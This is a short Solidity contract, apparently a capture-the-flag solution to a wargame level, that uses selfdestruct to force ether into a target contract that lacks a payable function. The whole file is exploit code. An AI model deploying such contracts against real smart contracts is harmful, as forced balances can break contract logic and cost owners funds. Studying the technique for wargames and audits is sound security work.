// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IForce {
}

contract ForceAttack {
    address public owner;
    IForce targetContract;
    uint targetValue;
     
    constructor(address _targetAddr) {
        targetContract = IForce(_targetAddr);
        owner = msg.sender;
    }

    function collect() public payable {
  
    }
    
    function selfDestroy() public {
        require(msg.sender == owner, "my hack!");
        selfdestruct(payable(address(targetContract)));
    }
}